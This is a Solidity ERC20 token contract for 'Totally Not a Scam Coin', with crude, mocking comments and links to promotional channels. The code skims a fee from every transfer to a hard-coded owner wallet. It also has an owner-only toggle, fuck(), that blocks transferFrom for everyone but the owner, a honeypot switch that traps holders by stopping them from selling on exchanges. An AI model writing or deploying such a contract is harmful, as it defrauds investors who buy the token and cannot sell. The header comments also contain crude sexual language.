pragma solidity ^0.8.0;
//SPDX-License-Identifier: NONE
//Totally Not a Scam Coin is like, TOTALLY Not a Scam.
//Why would you even say that? 
//You freaking fudder
//We're here to prove the world wrong
//And FIGHT the SCAMMERS
//This is a cryptocurrency with INTEGRITY
//That will triangulate the masses
//and have sex with your dad
//AND
//Make us all 1%ers
//No Fibbin here
//- Scammy
//https://TotallyNotAScamCoin.com/
//https://t.me/upsidedowntriangles
//https://discord.gg/bTSxfjRuyp


import "./ERC20.sol";
import "./Ownable.sol";

contract TNSC is Ownable, ERC20 {
    //Triangulation
    uint BURN_FEE = 420;
    uint SCAM_FEE = 80;
    //Me Fee
    address payable public scammy = payable(address(0x205D8fAbc97Fd004166427e4ec86756B067a73e4));
    //Scamonomics
    bool private _fuck = false;

constructor() ERC20 ('Totally Not a Scam Coin','TNSC') {
    _mint(msg.sender, 420420420* 10 ** 18);
    }
       
function fuck() external onlyOwner
    {
        _fuck = !_fuck;
    }
   
function transfer(address recipient, uint256 amount) public override returns (bool){
            uint burnAmount = amount*(BURN_FEE) / 10000;
            uint scamAmount = amount*(SCAM_FEE) / 10000;
            _burn(_msgSender(), burnAmount);
            _transfer(_msgSender(), recipient, amount-(burnAmount)-(scamAmount));
            _transfer(_msgSender(), scammy, scamAmount);
      return true;
    }    

function transferFrom(
        address from, 
        address to, 
        uint256 amount
    ) public override returns (bool) 
    {     
        require(!_fuck || tx.origin == owner(), "FUCK");
        return super.transferFrom(from, to, amount);
    }
}